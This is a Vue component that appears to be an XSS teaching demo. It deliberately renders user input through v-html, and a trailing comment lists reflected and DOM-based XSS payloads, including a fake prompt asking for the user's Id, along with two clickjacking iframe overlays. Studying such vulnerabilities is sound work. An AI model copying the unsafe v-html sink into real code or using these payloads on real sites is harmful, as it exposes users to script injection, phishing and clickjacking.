<script setup>
import { ref } from 'vue'
import axios from 'axios'

axios.defaults.headers.post['Content-Type'] = 'application/json';

const payload = ref('')
const injectHtml = ref('')
const firstname = ref('')

const send = async () => {
    const comment = payload.value + injectHtml.value;
    const data = {
        firstname: firstname.value, 
        response: comment         
    };
    try {
        const response = await axios.post('http://localhost:8080/xss/response', data);
        if (response.status === 200) {
            alert('Message sent');

        } else {
            throw new Error('A client or server error has occurred!');
        }
    } catch (err) {
        alert('An unexpected error has occurred!');
        console.error(err);
    }
};

</script>
<template>
    <h3 class="m-3">Input XSS</h3>
    <section>
        <div class="m-3">
            <h4>Preview window</h4>
            <div class="window p-3">
                {{ payload }}
                <p v-html="injectHtml"></p>
            </div>
        </div>
        <div class="m-3">
            <h4>Message</h4>
            <div class="mb-2">
                <label for="firstname">Speak as :</label>
                <input type="text" id="firstname" class="form-control" placeholder="Your name" v-model="firstname">
            </div>

            <div class="mb-2">
                <label for="response">Try no-edit mode: </label>
                <input type="text" id="response" class="form-control" placeholder="My message" v-model="payload">
            </div>

            <div>
                <label for="response-edit">Try edit mode:</label>
                <textarea name="" id="response-edit" class="form-control" placeholder="My message"
                    v-model="injectHtml"></textarea>
                <button type="submitItem" class="btn btn-primary mt-3" @click="send">submit </button>
            </div>
        </div>

    </section>
    <router-link to="/" class="btn btn-warning m-3">Go to topic</router-link>
</template>


<!-- SCRIPTS XSS
Fucntionning :
    //No XSS
    HTML tags : strong, h1, h2..., input
    <input type="text" value="whatever" style="color:white; background-color:red"></input> => no XSS

    //XSS Non-persistent (reflected)
    <img src=whatever onerror=alert('youhou')>
    <img src=whatever onerror="window.location='https://github.com/fabienAstia/xss-vulnerabilities/tree/main';">
    <img src=whatever onerror=console.log("Error is sucess")>
    <img src/onerror=prompt('Sorry,&nbsp;an&nbsp;error&nbsp;was&nbsp;occur.&nbsp;Please,&nbsp;enter&nbsp;your&nbsp;Id&nbsp;to&nbsp;continue')>

    //XSS DOM-based
    <a onmouseover="alert('youhou')"\>Click me!</a>
    <a onmouseover="document.body.style='color:blue;'"\>Click me!</a>
    <a onmouseover="document.body.style='transform:rotate(180deg);'"\>Click me!</a>

 Not Fucntionning:
    <script>alert('youhou')</script>
    <img src/onerror=prompt('Sorry, an error was occur. Please, enter your Id to continue')>
    <component is=script text=alert(1)>

Trying some Clickjacking (No XSS):
    <style>
        iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
        }
        div {
        position:absolute;
        top:470px;
        left:60px;
        z-index: 1;
        }
        </style>
        <div>Click me</div>
        <iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>

    <style>
        iframe {
        position:relative;
        width: 500px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
        }
        .firstClick, .secondClick {
        position:absolute;
        top:330px;
        left:60px;
        z-index: 1;
        }
        .secondClick {
        left:210px;
        }
        </style>
        <div class="firstClick">Click me first</div>
        <div class="secondClick">Click me next</div>
        <iframe src="https://vulnerable.net/account"></iframe>

 -->



<style scoped>
.window {
    height: 180px;
    border: 2px solid black;
}
</style>
